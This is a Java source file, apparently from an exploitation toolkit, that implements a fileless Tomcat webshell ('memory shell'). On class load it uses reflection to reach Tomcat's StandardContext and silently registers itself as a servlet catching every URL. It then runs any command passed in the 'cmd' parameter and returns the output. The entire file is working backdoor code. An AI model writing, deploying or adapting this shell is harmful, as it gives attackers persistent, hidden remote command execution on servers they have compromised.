package xyz.eki.marshalexp.memshell.Tomcat.Servlet;

import org.apache.catalina.Wrapper;
import org.apache.catalina.core.ApplicationServletRegistration;
import org.apache.catalina.core.StandardContext;
import org.apache.catalina.loader.WebappClassLoaderBase;

import javax.servlet.*;
import java.io.IOException;
import java.lang.reflect.Field;

/**
 * 使用 Thread 注入 Tomcat Servlet 型内存马
 */
public class TomcatServletMemshell implements Servlet {

    private final String cmdParamName = "cmd";
    private final static String pattern = "/*";

    static {
        try {
            String servletName = String.valueOf(System.nanoTime());

            // 获取 standardContext
            WebappClassLoaderBase webappClassLoaderBase = (WebappClassLoaderBase) Thread.currentThread().getContextClassLoader();

            StandardContext standardContext;

            try {
                standardContext = (StandardContext) webappClassLoaderBase.getResources().getContext();
            } catch (Exception ignored) {
                Field field = webappClassLoaderBase.getClass().getSuperclass().getDeclaredField("resources");
                field.setAccessible(true);
                Object root   = field.get(webappClassLoaderBase);
                Field  field2 = root.getClass().getDeclaredField("context");
                field2.setAccessible(true);

                standardContext = (StandardContext) field2.get(root);
            }


            if (standardContext.findChild(servletName) == null) {
                Wrapper wrapper = standardContext.createWrapper();
                wrapper.setName(servletName);
                standardContext.addChild(wrapper);
                Servlet servlet = new TomcatServletMemshell();

                wrapper.setServletClass(servlet.getClass().getName());
                wrapper.setServlet(servlet);
                ServletRegistration.Dynamic registration = new ApplicationServletRegistration(wrapper, standardContext);
                registration.addMapping(pattern);
            }
        } catch (Exception ignored) {
        }
    }

    @Override
    public void init(ServletConfig servletConfig) throws ServletException {

    }

    @Override
    public ServletConfig getServletConfig() {
        return null;
    }

    @Override
    public void service(ServletRequest servletRequest, ServletResponse servletResponse) throws IOException {
        System.out.println(
                "TomcatShellInject serlvet.....................................................................");
        String cmd;
        if ((cmd = servletRequest.getParameter(cmdParamName)) != null) {
            Process process = Runtime.getRuntime().exec(cmd);
            java.io.BufferedReader bufferedReader = new java.io.BufferedReader(
                    new java.io.InputStreamReader(process.getInputStream()));
            StringBuilder stringBuilder = new StringBuilder();
            String line;
            while ((line = bufferedReader.readLine()) != null) {
                stringBuilder.append(line + '\n');
            }
            servletResponse.getOutputStream().write(stringBuilder.toString().getBytes());
            servletResponse.getOutputStream().flush();
            servletResponse.getOutputStream().close();
            return;
        }
    }

    @Override
    public String getServletInfo() {
        return null;
    }

    @Override
    public void destroy() {
    }
}